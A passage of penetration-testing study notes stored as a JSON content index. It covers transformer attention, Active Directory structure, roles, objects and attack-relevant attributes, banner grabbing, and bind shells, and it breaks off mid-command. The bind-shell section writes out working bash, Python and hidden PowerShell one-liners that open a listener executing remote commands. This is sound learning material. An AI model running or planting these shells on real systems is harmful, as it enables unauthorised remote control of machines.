model.\nAttention\nThe encoder and decoder blocks in a transformer model include multiple layers that form the neural network for the model. We don’t need to go into the details of all these layers, but it’s useful to consider one of the types of layers that is used in both blocks: attention layers. Attention is a technique used to examine a sequence of text tokens and try to quantify the strength of the relationships between them. In particular, self-attention involves considering how other tokens around one particular token influence that token’s meaning.\nIn an encoder block, each token is carefully examined in context, and an appropriate encoding is determined for its vector embedding. The vector values are based on the relationship between the token and other tokens with which it frequently appears. This contextualized approach means that the same word might have multiple embeddings depending on the context in which it’s used - for example &quot;the bark of a tree&quot; means something different to &quot;I heard a dog bark&quot;.\nIn a decoder block, attention layers are used to predict the next token in a sequence. For each token generated, the model has an attention layer that takes into account the sequence of tokens up to that point. The model considers which of the tokens are the most influential when considering what the next token should be. For example, given the sequence &quot;I heard a dog&quot;, the attention layer might assign greater weight to the tokens &quot;heard&quot; and &quot;dog&quot; when considering the next word in the sequence:\nI heard a dog {bark}\nRemember that the attention layer is working with numeric vector representations of the tokens, not the actual text. In a decoder, the process starts with a sequence of token embeddings representing the text to be completed. The first thing that happens is that another positional encoding layer adds a value to each embedding to indicate its position in the sequence:\n- [**1**,5,6,2]  (I)\n- [**2**,9,3,1]  (heard)\n- [**3**,1,1,2]  (a)\n- [**4**,10,3,2] (dog)\n\nDuring training, the goal is to predict the vector for the final token in the sequence based on the preceding tokens. The attention layer assigns a numeric weight to each token in the sequence so far. It uses that value to perform a calculation on the weighted vectors that produces an attention score that can be used to calculate a possible vector for the next token. In practice, a technique called multi-head attention uses different elements of the embeddings to calculate multiple attention scores. A neural network is then used to evaluate all possible tokens to determine the most probable token with which to continue the sequence. The process continues iteratively for each token in the sequence, with the output sequence so far being used regressively as the input for the next iteration – essentially building the output one token at a time.\nThe following animation shows a simplified representation of how this works – in reality, the calculations performed by the attention layer are more complex; but the principles can be simplified as shown:\n\n\nA sequence of token embeddings is fed into the attention layer. Each token is represented as a vector of numeric values.\nThe goal in a decoder is to predict the next token in the sequence, which will also be a vector that aligns to an embedding in the model’s vocabulary.\nThe attention layer evaluates the sequence so far and assigns weights to each token to represent their relative influence on the next token.\nThe weights can be used to compute a new vector for the next token with an attention score. Multi-head attention uses different elements in the embeddings to calculate multiple alternative tokens.\nA fully connected neural network uses the scores in the calculated vectors to predict the most probable token from the entire vocabulary.\nThe predicted output is appended to the sequence so far, which is used as the input for the next iteration.\n\nDuring training, the actual sequence of tokens is known – we just mask the ones that come later in the sequence than the token position currently being considered. As in any neural network, the predicted value for the token vector is compared to the actual value of the next vector in the sequence, and the loss is calculated. The weights are then incrementally adjusted to reduce the loss and improve the model. When used for inferencing (predicting a new sequence of tokens), the trained attention layer applies weights that predict the most probable token in the model’s vocabulary that is semantically aligned to the sequence so far.\nWhat all of this means, is that a transformer model such as GPT-4 (the model behind ChatGPT and Bing) is designed to take in a text input (called a prompt) and generate a syntactically correct output (called a completion). In effect, the “magic” of the model is that it has the ability to string a coherent sentence together. This ability doesn’t imply any “knowledge” or “intelligence” on the part of the model; just a large vocabulary and the ability to generate meaningful sequences of words. What makes a large language model like GPT-4 so powerful however, is the sheer volume of data with which it has been trained (public and licensed data from the Internet) and the complexity of the network. This enables the model to generate completions that are based on the relationships between words in the vocabulary on which the model was trained; often generating output that is indistinguishable from a human response to the same prompt."},"HTB/AD-Functionality":{"slug":"HTB/AD-Functionality","filePath":"HTB/AD Functionality.md","title":"AD Functionality","links":["HTB/SID","HTB/Active-Directory","HTB/Services"],"tags":[],"content":"FSMO Roles\nThere are five Flexible Single Master Operation (FSMO) roles. These roles can be defined as follows:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRolesDescriptionSchema MasterThis role manages the read/write copy of the AD schema, which defines all attributes that can apply to an object in AD.Domain Naming MasterManages domain names and ensures that two domains of the same name are not created in the same forest.Relative ID (RID) MasterThe RID Master assigns blocks of RIDs to other DCs within the domain that can be used for new objects. The RID Master helps ensure that multiple objects are not assigned the same SID. Domain object SIDs are the domain SID combined with the RID number assigned to the object to make the unique SID.PDC EmulatorThe host with this role would be the authoritative DC in the domain and respond to authentication requests, password changes, and manage Group Policy Objects (GPOs). The PDC Emulator also maintains time within the domain.Infrastructure MasterThis role translates GUIDs, SIDs, and DNs between domains. This role is used in organizations with multiple domains in a single forest. The Infrastructure Master helps them to communicate. If this role is not functioning properly, Access Control Lists (ACLs) will show SIDs instead of fully resolved names.\nDepending on the organization, these roles may be assigned to specific DCs or as defaults each time a new DC is added. Issues with FSMO roles will lead to authentication and authorization difficulties within a domain.\n\nDomain and Forest Functional Levels\nMicrosoft introduced functional levels to determine the various features and capabilities available in Active Directory Domain Services (AD DS) at the domain and forest level. They are also used to specify which Windows Server operating systems can run a Domain Controller in a domain or forest. This and this article describe both the domain and forest functional levels from Windows 2000 native to Windows Server 2012 R2. Below is a quick overview of the differences in domain functional levels from Windows 2000 native up to Windows Server 2016, aside from all default Active Directory Directory Services features from the level just below it (or just the default AD DS features in the case of Windows 2000 native.)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDomain Functional LevelFeatures AvailableSupported Domain Controller Operating SystemsWindows 2000 nativeUniversal groups for distribution and security groups, group nesting, group conversion (between security and distribution and security groups), SID history.Windows Server 2008 R2, Windows Server 2008, Windows Server 2003, Windows 2000Windows Server 2003Netdom.exe domain management tool, lastLogonTimestamp attribute introduced, well-known users and computers containers, constrained delegation, selective authentication.Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008, Windows Server 2003Windows Server 2008Distributed File System (DFS) replication support, Advanced Encryption Standard (AES 128 and AES 256) support for the Kerberos protocol, Fine-grained password policiesWindows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008Windows Server 2008 R2Authentication mechanism assurance, Managed Service AccountsWindows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2Windows Server 2012KDC support for claims, compound authentication, and Kerberos armoringWindows Server 2012 R2, Windows Server 2012Windows Server 2012 R2Extra protections for members of the Protected Users group, Authentication Policies, Authentication Policy SilosWindows Server 2012 R2Windows Server 2016Smart card required for interactive logon new Kerberos features and new credential protection featuresWindows Server 2019 and Windows Server 2016\nA new functional level was not added with the release of Windows Server 2019. However, Windows Server 2008 functional level is the minimum requirement for adding Server 2019 Domain Controllers to an environment. Also, the target domain has to use DFS-R for SYSVOL replication.\nForest functional levels have introduced a few key capabilities over the years:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nVersionCapabilitiesWindows Server 2003saw the introduction of the forest trust, domain renaming, read-only domain controllers (RODC), and more.Windows Server 2008All new domains added to the forest default to the Server 2008 domain functional level. No additional new features.Windows Server 2008 R2Active Directory Recycle Bin provides the ability to restore deleted objects when AD DS is running.Windows Server 2012All new domains added to the forest default to the Server 2012 domain functional level. No additional new features.Windows Server 2012 R2All new domains added to the forest default to the Server 2012 R2 domain functional level. No additional new features.Windows Server 2016Privileged access management (PAM) using Microsoft Identity Manager (MIM).\n\nTrusts\nA trust is used to establish forest-forest or domain-domain authentication, allowing users to access resources in (or administer) another domain outside of the domain their account resides in. A trust creates a link between the authentication systems of two domains.\nThere are several trust types.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrust TypeDescriptionParent-childDomains within the same forest. The child domain has a two-way transitive trust with the parent domain.Cross-linka trust between child domains to speed up authentication.ExternalA non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering.Tree-roota two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.Foresta transitive trust between two forest root domains.\nTrust Example\n\nTrusts can be transitive or non-transitive.\n\nA transitive trust means that trust is extended to objects that the child domain trusts.\nIn a non-transitive trust, only the child domain itself is trusted.\n\nTrusts can be set up to be one-way or two-way (bidirectional).\n\nIn bidirectional trusts, users from both trusting domains can access resources.\nIn a one-way trust, only users in a trusted domain can access resources in a trusting domain, not vice-versa. The direction of trust is opposite to the direction of access.\n\nOften, domain trusts are set up improperly and provide unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications. Mergers and acquisitions can result in bidirectional trusts with acquired companies, unknowingly introducing risk into the acquiring company’s environment. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain."},"HTB/AD-Objects":{"slug":"HTB/AD-Objects","filePath":"HTB/AD Objects.md","title":"AD Objects","links":[],"tags":[],"content":"Reference: HTB\nWe will often see the term “objects” when referring to AD. What is an object? An object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers.\n\nUsers\nThese are the users within the organization’s AD environment. Users are considered leaf objects, which means that they cannot contain any other objects within them. Another example of a leaf object is a mailbox in Microsoft Exchange. A user object is considered a security principal and has a security identifier (SID) and a global unique identifier (GUID). User objects have many possible attributes, such as their display name, last login time, date of last password change, email address, account description, manager, address, and more. Depending on how a particular Active Directory environment is set up, there can be over 800 possible user attributes when accounting for ALL possible attributes as detailed here. This example goes far beyond what is typically populated for a standard user in most environments but shows Active Directory’s sheer size and complexity. They are a crucial target for attackers since gaining access to even a low privileged user can grant access to many objects and resources and allow for detailed enumeration of the entire domain (or forest).\nContacts\nA contact object is usually used to represent an external user and contains informational attributes such as first name, last name, email address, telephone number, etc. They are leaf objects and are NOT security principals (securable objects), so they don’t have a SID, only a GUID. An example would be a contact card for a third-party vendor or a customer.\nPrinters\nA printer object points to a printer accessible within the AD network. Like a contact, a printer is a leaf object and not a security principal, so it only has a GUID. Printers have attributes such as the printer’s name, driver information, port number, etc.\nComputers\nA computer object is any computer joined to the AD network (workstation or server). Computers are leaf objects because they do not contain other objects. However, they are considered security principals and have a SID and a GUID. Like users, they are prime targets for attackers since full administrative access to a computer (as the all-powerful NT AUTHORITY\\SYSTEM account) grants similar rights to a standard domain user and can be used to perform the majority of the enumeration tasks that a user account can (save for a few exceptions across domain trusts.)\nShared Folders\nA shared folder object points to a shared folder on the specific computer where the folder resides. Shared folders can have stringent access control applied to them and can be either accessible to everyone (even those without a valid AD account), open to only authenticated users (which means anyone with even the lowest privileged user account OR a computer account (NT AUTHORITY\\SYSTEM) could access it), or be locked down to only allow certain users/groups access. Anyone not explicitly allowed access will be denied from listing or reading its contents. Shared folders are NOT security principals and only have a GUID. A shared folder’s attributes can include the name, location on the system, security access rights.\nGroups\nA group is considered a container object because it can contain other objects, including users, computers, and even other groups. A group IS regarded as a security principal and has a SID and a GUID. In AD, groups are a way to manage user permissions and access to other securable objects (both users and computers). Let’s say we want to give 20 help desk users access to the Remote Management Users group on a jump host. Instead of adding the users one by one, we could add the group, and the users would inherit the intended permissions via their membership in the group. In Active Directory, we commonly see what are called “nested groups” (a group added as a member of another group), which can lead to a user(s) obtaining unintended rights. Nested group membership is something we see and often leverage during penetration tests. The tool BloodHound helps to discover attack paths within a network and illustrate them in a graphical interface. It is excellent for auditing group membership and uncovering/seeing the sometimes unintended impacts of nested group membership. Groups in AD can have many attributes, the most common being the name, description, membership, and other groups that the group belongs to. Many other attributes can be set, which we will discuss more in-depth later in this module.\nOrganizational Units (OUs)\nAn organizational unit, or OU from here on out, is a container that systems administrators can use to store similar objects for ease of administration. OUs are often used for administrative delegation of tasks without granting a user account full administrative rights. For example, we may have a top-level OU called Employees and then child OUs under it for the various departments such as Marketing, HR, Finance, Help Desk, etc. If an account were given the right to reset passwords over the top-level OU, this user would have the right to reset passwords for all users in the company. However, if the OU structure were such that specific departments were child OUs of the Help Desk OU, then any user placed in the Help Desk OU would have this right delegated to them if granted. Other tasks that may be delegated at the OU level include creating/deleting users, modifying group membership, managing Group Policy links, and performing password resets. OUs are very useful for managing Group Policy (which we will study later in this module) settings across a subset of users and groups within a domain. For example, we may want to set a specific password policy for privileged service accounts so these accounts could be placed in a particular OU and then have a Group Policy object assigned to it, which would enforce this password policy on all accounts placed inside of it. A few OU attributes include its name, members, security settings, and more.\nDomain\nA domain is the structure of an AD network. Domains contain objects such as users and computers, which are organized into container objects: groups and OUs. Every domain has its own separate database and sets of policies that can be applied to any and all objects within the domain. Some policies are set by default (and can be tweaked), such as the domain password policy. In contrast, others are created and applied based on the organization’s need, such as blocking access to cmd.exe for all non-administrative users or mapping shared drives at log in.\nDomain Controllers\nDomain Controllers are essentially the brains of an AD network. They handle authentication requests, verify users on the network, and control who can access the various resources in the domain. All access requests are validated via the domain controller and privileged access requests are based on predetermined roles assigned to users. It also enforces security policies and stores information about every other object in the domain.\nSites\nA site in AD is a set of computers across one or more subnets connected using high-speed links. They are used to make replication across domain controllers run efficiently.\nBuilt-in\nIn AD, built-in is a container that holds default groups in an AD domain. They are predefined when an AD domain is created.\nForeign Security Principals\nA foreign security principal (FSP) is an object created in AD to represent a security principal that belongs to a trusted external forest. They are created when an object such as a user, group, or computer from an external (outside of the current) forest is added to a group in the current domain. They are created automatically after adding a security principal to a group. Every foreign security principal is a placeholder object that holds the SID of the foreign object (an object that belongs to another forest.) Windows uses this SID to resolve the object’s name via the trust relationship. FSPs are created in a specific container named ForeignSecurityPrincipals with a distinguished name like cn=ForeignSecurityPrincipals,dc=inlanefreight,dc=local."},"HTB/AD-Terminologies":{"slug":"HTB/AD-Terminologies","filePath":"HTB/AD Terminologies.md","title":"AD Terminologies","links":["HTB/AD-Functionality","HTB/SMB"],"tags":[],"content":"Reference: HTB\nObject\nAn object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers, etc.\nAttributes\nEvery object in Active Directory has an associated set of attributes used to define characteristics of the given object. A computer object contains attributes such as the hostname and DNS name. All attributes in AD have an associated LDAP name that can be used when performing LDAP queries, such as displayName for Full Name and given name for First Name.\nSchema\nThe Active Directory schema is essentially the blueprint of any enterprise environment. It defines what types of objects can exist in the AD database and their associated attributes. It lists definitions corresponding to AD objects and holds information about each object. For example, users in AD belong to the class “user,” and computer objects to “computer,” and so on. Each object has its own information (some required to be set and others optional) that are stored in Attributes. When an object is created from a class, this is called instantiation, and an object created from a specific class is called an instance of that class. For example, if we take the computer RDS01. This computer object is an instance of the “computer” class in Active Directory.\nDomain\nA domain is a logical group of objects such as computers, users, OUs, groups, etc. We can think of each domain as a different city within a state or country. Domains can operate entirely independently of one another or be connected via trust relationships.\nForest\nA forest is a collection of Active Directory domains. It is the topmost container and contains all of the AD objects introduced below, including but not limited to domains, users, groups, computers, and Group Policy objects. A forest can contain one or multiple domains and be thought of as a state in the US or a country within the EU. Each forest operates independently but may have various trust relationships with other forests.\nTree\nA tree is a collection of Active Directory domains that begins at a single root domain. A forest is a collection of AD trees. Each domain in a tree shares a boundary with the other domains. A parent-child trust relationship is formed when a domain is added under another domain in a tree. Two trees in the same forest cannot share a name (namespace). Let’s say we have two trees in an AD forest: inlanefreight.local and ilfreight.local. A child domain of the first would be corp.inlanefreight.local while a child domain of the second could be corp.ilfreight.local. All domains in a tree share a standard Global Catalog which contains all information about objects that belong to the tree.\nContainer\nContainer objects hold other objects and have a defined place in the directory subtree hierarchy.\nLeaf\nLeaf objects do not contain other objects and are found at the end of the subtree hierarchy.\nGlobal Unique Identifier (GUID)\nA GUID is a unique 128-bit value assigned when a domain user or group is created. This GUID value is unique across the enterprise, similar to a MAC address. Every single object created by Active Directory is assigned a GUID, not only user and group objects. The GUID is stored in the ObjectGUID attribute. When querying for an AD object (such as a user, group, computer, domain, domain controller, etc.), we can query for its objectGUID value using PowerShell or search for it by specifying its distinguished name, GUID, SID, or SAM account name. GUIDs are used by AD to identify objects internally. Searching in Active Directory by GUID value is probably the most accurate and reliable way to find the exact object you are looking for, especially if the global catalog may contain similar matches for an object name. Specifying the ObjectGUID value when performing AD enumeration will ensure that we get the most accurate results pertaining to the object we are searching for information about. The ObjectGUID property never changes and is associated with the object for as long as that object exists in the domain.\nSecurity principals\nSecurity principals are anything that the operating system can authenticate, including users, computer accounts, or even threads/processes that run in the context of a user or computer account (i.e., an application such as Tomcat running in the context of a service account within the domain). In AD, security principles are domain objects that can manage access to other resources within the domain. We can also have local user accounts and security groups used to control access to resources on only that specific computer. These are not managed by AD but rather by the Security Accounts Manager (SAM).\nSecurity Identifier (SID)\nA security identifier, or SID is used as a unique identifier for a security principal or security group. Every account, group, or process has its own unique SID, which, in an AD environment, is issued by the domain controller and stored in a secure database. A SID can only be used once. Even if the security principle is deleted, it can never be used again in that environment to identify another user or group. When a user logs in, the system creates an access token for them which contains the user’s SID, the rights they have been granted, and the SIDs for any groups that the user is a member of. This token is used to check rights whenever the user performs an action on the computer. There are also well-known SIDs that are used to identify generic users and groups. These are the same across all operating systems. An example is the Everyone group.\nDistinguished Name (DN)\nA Distinguished Name (DN) describes the full path to an object in AD (such as cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local). In this example, the user bjones works in the IT department of the company Inlanefreight, and his account is created in an Organizational Unit (OU) that holds accounts for company employees. The Common Name (CN) bjones is just one way the user object could be searched for or accessed within the domain.\nRelative Distinguished Name (RDN)\nA Relative Distinguished Name (RDN) is a single component of the Distinguished Name that identifies the object as unique from other objects at the current level in the naming hierarchy. In our example, bjones is the Relative Distinguished Name of the object. AD does not allow two objects with the same name under the same parent container, but there can be two objects with the same RDNs that are still unique in the domain because they have different DNs. For example, the object cn=bjones,dc=dev,dc=inlanefreight,dc=local would be recognized as different from cn=bjones,dc=inlanefreight,dc=local.\n\nsAMAccountName\nThe sAMAccountName is the user’s logon name. Here it would just be bjones. It must be a unique value and 20 or fewer characters.\nuserPrincipalName\nThe userPrincipalName attribute is another way to identify users in AD. This attribute consists of a prefix (the user account name) and a suffix (the domain name) in the format of bjones@inlanefreight.local. This attribute is not mandatory.\nFSMO Roles\nVarious FSMO roles are discussed in detail in AD Functionality chapter.\nIn the early days of AD, if you had multiple Domain Controllers (DC) in an environment, they would fight over which DC gets to make changes, and sometimes changes would not be made properly. Microsoft then implemented “last writer wins,” which could introduce its own problems if the last change breaks things. They then introduced a model in which a single “master” DC could apply changes to the domain while the others merely fulfilled authentication requests. This was a flawed design because if the master DC went down, no changes could be made to the environment until it was restored. To resolve this single point of failure model, Microsoft separated the various responsibilities that a DC can have into Flexible Single Master Operation (FSMO) roles. These give Domain Controllers (DC) the ability to continue authenticating users and granting permissions without interruption (authorization and authentication). There are five FSMO roles: Schema Master and Domain Naming Master (one of each per forest), Relative ID (RID) Master (one per domain), Primary Domain Controller (PDC) Emulator (one per domain), and Infrastructure Master (one per domain). All five roles are assigned to the first DC in the forest root domain in a new AD forest. Each time a new domain is added to a forest, only the RID Master, PDC Emulator, and Infrastructure Master roles are assigned to the new domain. FSMO roles are typically set when domain controllers are created, but sysadmins can transfer these roles if needed. These roles help replication in AD to run smoothly and ensure that critical services are operating correctly. We will walk through each of these roles in detail later in this section.\nGlobal Catalog\nA global catalog (GC) is a domain controller that stores copies of ALL objects in an Active Directory forest. The GC stores a full copy of all objects in the current domain and a partial copy of objects that belong to other domains in the forest. Standard domain controllers hold a complete replica of objects belonging to its domain but not those of different domains in the forest. The GC allows both users and applications to find information about any objects in ANY domain in the forest. GC is a feature that is enabled on a domain controller and performs the following functions:\n\nAuthentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated)\nObject search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.)\n\nRead-Only Domain Controller (RODC)\nA Read-Only Domain Controller (RODC) has a read-only Active Directory database. No AD account passwords are cached on an RODC (other than the RODC computer account &amp; RODC KRBTGT passwords.) No changes are pushed out via an RODC’s AD database, SYSVOL, or DNS. RODCs also include a read-only DNS server, allow for administrator role separation, reduce replication traffic in the environment, and prevent SYSVOL modifications from being replicated to other DCs.\nReplication\nReplication happens in AD when AD objects are updated and transferred from one Domain Controller to another. Whenever a DC is added, connection objects are created to manage replication between them. These connections are made by the Knowledge Consistency Checker (KCC) service, which is present on all DCs. Replication ensures that changes are synchronized with all other DCs in a forest, helping to create a backup in case one domain controller fails.\nService Principal Name (SPN)\nA Service Principal Name (SPN) uniquely identifies a service instance. They are used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name.\nGroup Policy Object (GPO)\nGroup Policy Objects (GPOs) are virtual collections of policy settings. Each GPO has a unique Global Unique Identifier (GUID). A GPO can contain local file system settings or Active Directory settings. GPO settings can be applied to both user and computer objects. They can be applied to all users and computers within the domain or defined more granularly at the OU level.\nAccess Control List (ACL)\nAn Access Control List (ACL) is the ordered collection of Access Control Entries (ACEs) that apply to an object.\nAccess Control Entries (ACEs)\nEach Access Control Entry (ACE) in an ACL identifies a trustee (user account, group account, or logon session) and lists the access rights that are allowed, denied, or audited for the given trustee.\nDiscretionary Access Control List (DACL)\nDACLs define which security principles are granted or denied access to an object; it contains a list of ACEs. When a process tries to access a securable object, the system checks the ACEs in the object’s DACL to determine whether or not to grant access. If an object does NOT have a DACL, then the system will grant full access to everyone, but if the DACL has no ACE entries, the system will deny all access attempts. ACEs in the DACL are checked in sequence until a match is found that allows the requested rights or until access is denied.\nSystem Access Control Lists (SACL)\nAllows for administrators to log access attempts that are made to secured objects. ACEs specify the types of access attempts that cause the system to generate a record in the security event log.\nFully Qualified Domain Name (FQDN)\nAn FQDN is the complete name for a specific computer or host. It is written with the hostname and domain name in the format [host name].[domain name].[tld]. This is used to specify an object’s location in the tree hierarchy of DNS. The FQDN can be used to locate hosts in an Active Directory without knowing the IP address, much like when browsing to a website such as google.com instead of typing in the associated IP address. An example would be the host DC01 in the domain INLANEFREIGHT.LOCAL. The FQDN here would be DC01.INLANEFREIGHT.LOCAL.\nTombstone\nA tombstone is a container object in AD that holds deleted AD objects. When an object is deleted from AD, the object remains for a set period of time known as the Tombstone Lifetime, and the isDeleted attribute is set to TRUE. Once an object exceeds the Tombstone Lifetime, it will be entirely removed. Microsoft recommends a tombstone lifetime of 180 days to increase the usefulness of backups, but this value may differ across environments. Depending on the DC operating system version, this value will default to 60 or 180 days. If an object is deleted in a domain that does not have an AD Recycle Bin, it will become a tombstone object. When this happens, the object is stripped of most of its attributes and placed in the Deleted Objects container for the duration of the tombstoneLifetime. It can be recovered, but any attributes that were lost can no longer be recovered.\nAD Recycle Bin\nThe AD Recycle Bin was first introduced in Windows Server 2008 R2 to facilitate the recovery of deleted AD objects. This made it easier for sysadmins to restore objects, avoiding the need to restore from backups, restarting Active Directory Domain Services (AD DS), or rebooting a Domain Controller. When the AD Recycle Bin is enabled, any deleted objects are preserved for a period of time, facilitating restoration if needed. Sysadmins can set how long an object remains in a deleted, recoverable state. If this is not specified, the object will be restorable for a default value of 60 days. The biggest advantage of using the AD Recycle Bin is that most of a deleted object’s attributes are preserved, which makes it far easier to fully restore a deleted object to its previous state.\nSYSVOL\nThe SYSVOL folder, or share, stores copies of public files in the domain such as system policies, Group Policy settings, logon/logoff scripts, and often contains other types of scripts that are executed to perform various tasks in the AD environment. The contents of the SYSVOL folder are replicated to all DCs within the environment using File Replication Services (FRS). You can read more about the SYSVOL structure here.\nAdminSDHolder\nThe AdminSDHolder object is used to manage Access Control List (ACL) for members of built-in groups in AD marked as privileged. It acts as a container that holds the Security Descriptor applied to members of protected groups. The SDProp (SD Propagator) process runs on a schedule on the PDC Emulator Domain Controller. When this process runs, it checks members of protected groups to ensure that the correct ACL is applied to them. It runs every hour by default. For example, suppose an attacker is able to create a malicious ACL entry to grant a user certain rights over a member of the Domain Admins group. In that case, unless they modify other settings in AD, these rights will be removed (and they will lose any persistence they were hoping to achieve) when the SDProp process runs on the set interval.\ndsHeuristics\nThe dsHeuristics attribute is a string value set on the Directory Service object used to define multiple forest-wide configuration settings. One of these settings is to exclude built-in groups from the Protected Groups list. Groups in this list are protected from modification via the AdminSDHolder object. If a group is excluded via the dsHeuristics attribute, then any changes that affect it will not be reverted when the SDProp process runs.\nadminCount\nThe adminCount attribute determines whether or not the SDProp process protects a user. If the value is set to 0 or not specified, the user is not protected. If the attribute value is set to 1, the user is protected. Attackers will often look for accounts with the adminCount attribute set to 1 to target in an internal environment. These are often privileged accounts and may lead to further access or full domain compromise.\nActive Directory Users and Computers (ADUC)\nADUC is a GUI console commonly used for managing users, groups, computers, and contacts in AD. Changes made in ADUC can be done via PowerShell as well.\nADSI Edit\nADSI Edit is a GUI tool used to manage objects in AD. It provides access to far more than is available in ADUC and can be used to set or delete any attribute available on an object, add, remove, and move objects as well. It is a powerful tool that allows a user to access AD at a much deeper level. Great care should be taken when using this tool, as changes here could cause major problems in AD.\nsIDHistory\nThis attribute holds any SIDs that an object was assigned previously. It is usually used in migrations so a user can maintain the same level of access when migrated from one domain to another. This attribute can potentially be abused if set insecurely, allowing an attacker to gain prior elevated access that an account had before a migration if SID Filtering (or removing SIDs from another domain from a user’s access token that could be used for elevated access) is not enabled.\nNTDS.DIT\nThe NTDS.DIT file can be considered the heart of Active Directory. It is stored on a Domain Controller at C:\\Windows\\NTDS\\ and is a database that stores AD data such as information about user and group objects, group membership, and, most important to attackers and penetration testers, the password hashes for all users in the domain. Once full domain compromise is reached, an attacker can retrieve this file, extract the hashes, and either use them to perform a pass-the-hash attack or crack them offline using a tool such as Hashcat to access additional resources in the domain. If the setting Store password with reversible encryption is enabled, then the NTDS.DIT will also store the cleartext passwords for all users created or who changed their password after this policy was set. While rare, some organizations may enable this setting if they use applications or protocols that need to use a user’s existing password (and not Kerberos) for authentication.\nMSBROWSE\nMSBROWSE is a Microsoft networking protocol that was used in early versions of Windows-based local area networks (LANs) to provide browsing services. It was used to maintain a list of resources, such as shared printers and files, that were available on the network, and to allow users to easily browse and access these resources.\nIn older version of Windows we could use nbtstat -A ip-address to search for the Master Browser. If we see MSBROWSE it means that’s the Master Browser. Aditionally we could use nltest utility to query a Windows Master Browser for the names of the Domain Controllers.\nToday, MSBROWSE is largely obsolete and is no longer in widespread use. Modern Windows-based LANs use the Server Message Block (SMB) protocol for file and printer sharing, and the Common Internet File System (CIFS) protocol for browsing services."},"HTB/Active-Directory":{"slug":"HTB/Active-Directory","filePath":"HTB/Active Directory.md","title":"Active Directory","links":["HTB/AD-Terminologies","HTB/AD-Objects","HTB/AD-Functionality"],"tags":[],"content":"References: HTB\nActive Directory Fundamentals\n\nActive Directory provides authentication and  authorization within a Windows domain environment.\nIt is a windows service that allows for centralized management of an organization’s resources, including users, computers, groups, network devices, file shares, group policies, devices, and trusts.\nAD is essentially a sizeable read-only database accessible to all users within the domain, regardless of their privilege level. ANY user account, regardless of their privilege level, can be used to enumerate the domain and hunt for misconfigurations and flaws thoroughly.\n\n\nActive Directory Structure\nReference: HTB\nActive Directory Structure contains top level domains which may be linked together using relations, and have multiple subdomains. When top domains are in relation the subdomains do not necessarily have relation and need specifying if wanted to.\nAD Terminologies\nVarious terminologies related to active directory can be found here. Its a glossary of terms.\nAD Objects\nDifferent Objects in Active Directory\nAD Functionality"},"HTB/Banner-grabbing":{"slug":"HTB/Banner-grabbing","filePath":"HTB/Banner grabbing.md","title":"Banner grabbing","links":["tags/Reconnaissance","Netcat","HTB/Nmap","cURL"],"tags":["Reconnaissance"],"content":"Reconnaissance\nBanner grabbing is a useful technique to fingerprint a service quickly, i.e. to see what is being run at a given port.\nMethods\n1. Using Netcat:\nSyntax:\nnc -nv &lt;host&gt; &lt;port&gt;\n2. Using Nmap\nSyntax\nnmap -sV --script=banner -p&lt;port number&gt; &lt;host&gt;/&lt;port&gt;\n3. Using cURL"},"HTB/Bind-Shell":{"slug":"HTB/Bind-Shell","filePath":"HTB/Bind Shell.md","title":"Bind Shell","links":["Netcat"],"tags":[],"content":"Bind shell is opposite of reverse shell. Instead of we listening and target connecting, here target listens and we connect to it.\nBind Shell Commands\nFor Bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f\nFor Python\npython -c &#039;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#039;\nFor Powershell\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\nConnecting to target\nWe use Netcat to connect to the port and get connection to the shell.\nUsage\nnc &lt;target ip&gt; &lt;port&gt;\nUpgrading TTY\nUpgrading TTY will allow better interactions with the remote shell.  This can be achieved by mapping our terminal TTY with the remote TTY.\nThere are multiple methods to achieve this. One of them is using python/stty method.\n1. Step 1\npython -c &#039;import pty; pty.spawn(&quot;/bin/bash&quot;)&#039;\n2. Step 2\nHit ctrl+z to background our shell and get back on our local terminal, and input the following stty command, then input fg command to bring netcat shell to foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell.\n$stty raw 